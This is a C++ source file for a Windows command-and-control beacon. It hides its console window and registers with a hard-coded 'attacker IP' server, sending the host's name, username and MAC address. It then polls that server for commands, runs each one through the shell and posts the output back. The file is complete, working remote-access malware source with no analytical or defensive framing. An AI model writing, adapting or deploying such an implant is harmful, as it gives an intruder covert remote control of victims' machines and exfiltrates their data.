#include <windows.h>
#include <winhttp.h>
#include <string>
#include <sstream>
#include <iostream>
#include <vector>
#include <iphlpapi.h>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")

// =============================================
// CONFIGURATION - CHANGE THIS TO YOUR ATTACKER IP
// =============================================
const std::wstring C2_HOST = L"192.168.211.183";   // <-- Your Windows 10 IP
const int C2_PORT = 8080;
const int SLEEP_SECONDS = 5;
// =============================================

// Helper: Convert string to wstring (only for headers, not for POST body)
std::wstring s2ws(const std::string& str) {
    if (str.empty()) return L"";
    int size = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstr(size, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstr[0], size);
    return wstr;
}

// Generate a unique beacon ID (MAC address + computer name)
std::string get_beacon_id() {
    char compname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(compname);
    GetComputerNameA(compname, &size);
    std::string id = compname;

    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
    }
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            if (pAdapter->AddressLength == 6) {
                char mac[18];
                sprintf_s(mac, "%02X%02X%02X%02X%02X%02X",
                    pAdapter->Address[0], pAdapter->Address[1], pAdapter->Address[2],
                    pAdapter->Address[3], pAdapter->Address[4], pAdapter->Address[5]);
                id += "-" + std::string(mac);
                break;
            }
            pAdapter = pAdapter->Next;
        }
    }
    free(pAdapterInfo);
    return id;
}

std::string get_hostname() {
    char name[256];
    DWORD size = sizeof(name);
    GetComputerNameA(name, &size);
    return std::string(name);
}

std::string get_username() {
    char name[256];
    DWORD size = sizeof(name);
    GetUserNameA(name, &size);
    return std::string(name);
}

std::string get_os_version() {
    return "Windows Server 2016";
}

// FIXED: Send POST request with raw UTF-8 bytes (no wide conversion for body)
bool send_post(const std::wstring& endpoint, const std::string& data, const std::wstring& content_type) {
    HINTERNET hSession = WinHttpOpen(L"Beacon/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    HINTERNET hConnect = WinHttpConnect(hSession, C2_HOST.c_str(), C2_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", endpoint.c_str(), NULL, NULL, NULL, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    std::wstring headers = L"Content-Type: " + content_type + L"\r\n";
    // Send data as raw bytes (char*), size is byte count
    BOOL result = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.size(),
                                     (LPVOID)data.c_str(), (DWORD)data.size(), (DWORD)data.size(), 0);
    if (result) {
        WinHttpReceiveResponse(hRequest, NULL);
    }
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return result == TRUE;
}

void register_beacon() {
    std::string id = get_beacon_id();
    std::string host = get_hostname();
    std::string user = get_username();
    std::string os = get_os_version();
    // Build proper JSON (double quotes around property names)
    std::string json = "{\"id\":\"" + id + "\",\"hostname\":\"" + host + "\",\"username\":\"" + user + "\",\"os\":\"" + os + "\",\"sleep\":" + std::to_string(SLEEP_SECONDS) + "}";
    send_post(L"/register", json, L"application/json");
}

std::string get_command(const std::string& beacon_id) {
    std::wstring endpoint = L"/command/" + s2ws(beacon_id);
    HINTERNET hSession = WinHttpOpen(L"Beacon/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "";
    HINTERNET hConnect = WinHttpConnect(hSession, C2_HOST.c_str(), C2_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return ""; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", endpoint.c_str(), NULL, NULL, NULL, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return ""; }

    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);

    DWORD bytes_available = 0;
    std::string response;
    if (WinHttpQueryDataAvailable(hRequest, &bytes_available) && bytes_available > 0) {
        char* buffer = new char[bytes_available + 1];
        DWORD bytes_read = 0;
        if (WinHttpReadData(hRequest, buffer, bytes_available, &bytes_read)) {
            buffer[bytes_read] = '\0';
            response = buffer;
        }
        delete[] buffer;
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return response;
}

std::string exec_cmd(const std::string& cmd) {
    std::string result;
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "ERROR: Failed to execute command.";
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result += buffer;
    }
    _pclose(pipe);
    if (result.empty()) result = "[Command executed successfully with no output.]";
    return result;
}

void send_callback(const std::string& beacon_id, const std::string& output) {
    // URL encode the output? For simplicity we skip; but avoid breaking POST data.
    // A better approach: base64 or replace & and =.
    // Here we just send as-is (may break if output contains & or =)
    std::string post_data = "id=" + beacon_id + "&output=" + output;
    send_post(L"/callback", post_data, L"application/x-www-form-urlencoded");
}

int main() {
    // Hide console window (optional, comment out for debugging)
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    std::string beacon_id = get_beacon_id();
    register_beacon();

    while (true) {
        std::string cmd = get_command(beacon_id);
        if (!cmd.empty()) {
            std::string output = exec_cmd(cmd);
            send_callback(beacon_id, output);
        }
        Sleep(SLEEP_SECONDS * 1000);
    }
    return 0;
}